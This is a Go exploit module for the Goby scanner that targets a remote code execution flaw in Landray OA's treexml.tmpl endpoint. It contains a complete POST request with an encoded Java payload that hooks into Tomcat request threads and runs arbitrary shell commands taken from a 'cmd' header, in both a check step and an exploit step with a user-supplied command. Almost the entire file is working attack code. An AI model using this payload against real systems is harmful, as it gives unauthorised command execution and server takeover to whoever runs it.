package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "蓝凌OA treexml.tmpl 远程代码执行漏洞",
  "Description": "<p><span style=\"color: rgba(0, 0, 0, 0.8); font-size: 16px;\">蓝凌OA treexml.tmpl存在远程代码执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限</span><br></p>",
  "Product": "蓝凌OA",
  "Homepage": "www.landray.com.cn",
  "DisclosureDate": "2022-07-18",
  "Author": "",
  "FofaQuery": "app=\"Landray-OA系统\"",
  "GobyQuery": "app=\"Landray-OA系统\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20treexml.tmpl%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "command",
      "type": "input",
      "value": "whoami",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/data/sys-common/treexml.tmpl",
        "follow_redirect": true,
        "header": {
          "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
          "Accept-Encoding": "gzip, deflate",
          "cmd": "echo This page has a bug",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "s_bean=ruleFormulaValidate&script=boolean+flag+%3d+false%3bThreadGroup+group+%3d+Thread.currentThread().getThreadGroup()%3bjava.lang.reflect.Field+f+%3d+group.getClass().getDeclaredField(\"threads\")%3bf.setAccessible(true)%3bThread[]+threads+%3d+(Thread[])+f.get(group)%3bfor+(int+i+%3d+0%3b+i+<+threads.length%3b+i%2b%2b)+{+try+{+Thread+t+%3d+threads[i]%3bif+(t+%3d%3d+null)+{+continue%3b+}String+str+%3d+t.getName()%3bif+(str.contains(\"exec\")+||+!str.contains(\"http\"))+{+continue%3b+}f+%3d+t.getClass().getDeclaredField(\"target\")%3bf.setAccessible(true)%3bObject+obj+%3d+f.get(t)%3bif+(!(obj+instanceof+Runnable))+{+continue%3b+}f+%3d+obj.getClass().getDeclaredField(\"this$0\")%3bf.setAccessible(true)%3bobj+%3d+f.get(obj)%3btry+{+f+%3d+obj.getClass().getDeclaredField(\"handler\")%3b+}+catch+(NoSuchFieldException+e)+{+f+%3d+obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\")%3b+}f.setAccessible(true)%3bobj+%3d+f.get(obj)%3btry+{+f+%3d+obj.getClass().getSuperclass().getDeclaredField(\"global\")%3b+}catch+(NoSuchFieldException+e)+{+f+%3d+obj.getClass().getDeclaredField(\"global\")%3b+}f.setAccessible(true)%3bobj+%3d+f.get(obj)%3bf+%3d+obj.getClass().getDeclaredField(\"processors\")%3bf.setAccessible(true)%3bjava.util.List+processors+%3d+(java.util.List)+(f.get(obj))%3bfor+(int+j+%3d+0%3b+j+<+processors.size()%3b+%2b%2bj)+{+Object+processor+%3d+processors.get(j)%3bf+%3d+processor.getClass().getDeclaredField(\"req\")%3bf.setAccessible(true)%3bObject+req+%3d+f.get(processor)%3bObject+resp+%3d+req.getClass().getMethod(\"getResponse\",+new+Class[0]).invoke(req,+new+Object[0])%3bstr+%3d+(String)+req.getClass().getMethod(\"getHeader\",+new+Class[]{String.class}).invoke(req,+new+Object[]{\"cmd\"})%3bif+(str+!%3d+null+%26%26+!str.isEmpty())+{+resp.getClass().getMethod(\"setStatus\",+new+Class[]{int.class}).invoke(resp,+new+Object[]{new+Integer(200)})%3bString[]+cmds+%3d+System.getProperty(\"os.name\").toLowerCase().contains(\"window\")+%3f+new+String[]{\"cmd.exe\",+\"/c\",+str}+%3a+new+String[]{\"/bin/sh\",+\"-c\",+str}%3bString+charsetName+%3d+System.getProperty(\"os.name\").toLowerCase().contains(\"window\")+%3f+\"GBK\"%3a\"UTF-8\"%3bbyte[]+text2+%3d(new+java.util.Scanner((new+ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter(\"\\\\A\").next().getBytes(charsetName)%3bbyte[]+result%3d(\"Execute%3a++++\"%2bnew+String(text2,\"utf-8\")).getBytes(charsetName)%3btry+{+Class+cls+%3d+Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\")%3bobj+%3d+cls.newInstance()%3bcls.getDeclaredMethod(\"setBytes\",+new+Class[]{byte[].class,+int.class,+int.class}).invoke(obj,+new+Object[]{result,+new+Integer(0),+new+Integer(result.length)})%3bresp.getClass().getMethod(\"doWrite\",+new+Class[]{cls}).invoke(resp,+new+Object[]{obj})%3b+}+catch+(NoSuchMethodException+var5)+{+Class+cls+%3d+Class.forName(\"java.nio.ByteBuffer\")%3bobj+%3d+cls.getDeclaredMethod(\"wrap\",+new+Class[]{byte[].class}).invoke(cls,+new+Object[]{result})%3bresp.getClass().getMethod(\"doWrite\",+new+Class[]{cls}).invoke(resp,+new+Object[]{obj})%3b+}flag+%3d+true%3b+}if+(flag)+{+break%3b+}+}if+(flag)+{+break%3b+}+}+catch+(Exception+e)+{+continue%3b+}+}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "This page has a bug",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/data/sys-common/treexml.tmpl",
        "follow_redirect": true,
        "header": {
          "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
          "Accept-Encoding": "gzip, deflate",
          "cmd": "{{{command}}}",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "s_bean=ruleFormulaValidate&script=boolean+flag+%3d+false%3bThreadGroup+group+%3d+Thread.currentThread().getThreadGroup()%3bjava.lang.reflect.Field+f+%3d+group.getClass().getDeclaredField(\"threads\")%3bf.setAccessible(true)%3bThread[]+threads+%3d+(Thread[])+f.get(group)%3bfor+(int+i+%3d+0%3b+i+<+threads.length%3b+i%2b%2b)+{+try+{+Thread+t+%3d+threads[i]%3bif+(t+%3d%3d+null)+{+continue%3b+}String+str+%3d+t.getName()%3bif+(str.contains(\"exec\")+||+!str.contains(\"http\"))+{+continue%3b+}f+%3d+t.getClass().getDeclaredField(\"target\")%3bf.setAccessible(true)%3bObject+obj+%3d+f.get(t)%3bif+(!(obj+instanceof+Runnable))+{+continue%3b+}f+%3d+obj.getClass().getDeclaredField(\"this$0\")%3bf.setAccessible(true)%3bobj+%3d+f.get(obj)%3btry+{+f+%3d+obj.getClass().getDeclaredField(\"handler\")%3b+}+catch+(NoSuchFieldException+e)+{+f+%3d+obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\")%3b+}f.setAccessible(true)%3bobj+%3d+f.get(obj)%3btry+{+f+%3d+obj.getClass().getSuperclass().getDeclaredField(\"global\")%3b+}catch+(NoSuchFieldException+e)+{+f+%3d+obj.getClass().getDeclaredField(\"global\")%3b+}f.setAccessible(true)%3bobj+%3d+f.get(obj)%3bf+%3d+obj.getClass().getDeclaredField(\"processors\")%3bf.setAccessible(true)%3bjava.util.List+processors+%3d+(java.util.List)+(f.get(obj))%3bfor+(int+j+%3d+0%3b+j+<+processors.size()%3b+%2b%2bj)+{+Object+processor+%3d+processors.get(j)%3bf+%3d+processor.getClass().getDeclaredField(\"req\")%3bf.setAccessible(true)%3bObject+req+%3d+f.get(processor)%3bObject+resp+%3d+req.getClass().getMethod(\"getResponse\",+new+Class[0]).invoke(req,+new+Object[0])%3bstr+%3d+(String)+req.getClass().getMethod(\"getHeader\",+new+Class[]{String.class}).invoke(req,+new+Object[]{\"cmd\"})%3bif+(str+!%3d+null+%26%26+!str.isEmpty())+{+resp.getClass().getMethod(\"setStatus\",+new+Class[]{int.class}).invoke(resp,+new+Object[]{new+Integer(200)})%3bString[]+cmds+%3d+System.getProperty(\"os.name\").toLowerCase().contains(\"window\")+%3f+new+String[]{\"cmd.exe\",+\"/c\",+str}+%3a+new+String[]{\"/bin/sh\",+\"-c\",+str}%3bString+charsetName+%3d+System.getProperty(\"os.name\").toLowerCase().contains(\"window\")+%3f+\"GBK\"%3a\"UTF-8\"%3bbyte[]+text2+%3d(new+java.util.Scanner((new+ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter(\"\\\\A\").next().getBytes(charsetName)%3bbyte[]+result%3d(\"Execute%3a++++\"%2bnew+String(text2,\"utf-8\")).getBytes(charsetName)%3btry+{+Class+cls+%3d+Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\")%3bobj+%3d+cls.newInstance()%3bcls.getDeclaredMethod(\"setBytes\",+new+Class[]{byte[].class,+int.class,+int.class}).invoke(obj,+new+Object[]{result,+new+Integer(0),+new+Integer(result.length)})%3bresp.getClass().getMethod(\"doWrite\",+new+Class[]{cls}).invoke(resp,+new+Object[]{obj})%3b+}+catch+(NoSuchMethodException+var5)+{+Class+cls+%3d+Class.forName(\"java.nio.ByteBuffer\")%3bobj+%3d+cls.getDeclaredMethod(\"wrap\",+new+Class[]{byte[].class}).invoke(cls,+new+Object[]{result})%3bresp.getClass().getMethod(\"doWrite\",+new+Class[]{cls}).invoke(resp,+new+Object[]{obj})%3b+}flag+%3d+true%3b+}if+(flag)+{+break%3b+}+}if+(flag)+{+break%3b+}+}+catch+(Exception+e)+{+continue%3b+}+}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody||"
      ]
    }
  ],
  "Tags": [
    "代码执⾏"
  ],
  "VulType": [
    "代码执⾏"
  ],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "蓝凌OA treexml.tmpl 远程代码执行漏洞",
      "Product": "蓝凌OA",
      "Description": "<p><span style=\"color: rgba(0, 0, 0, 0.8); font-size: 16px;\">蓝凌OA treexml.tmpl存在远程代码执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限</span><br></p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [
        "代码执⾏"
      ],
      "Tags": [
        "代码执⾏"
      ]
    },
    "EN": {
      "Name": "landray-oa-treexml-rce",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}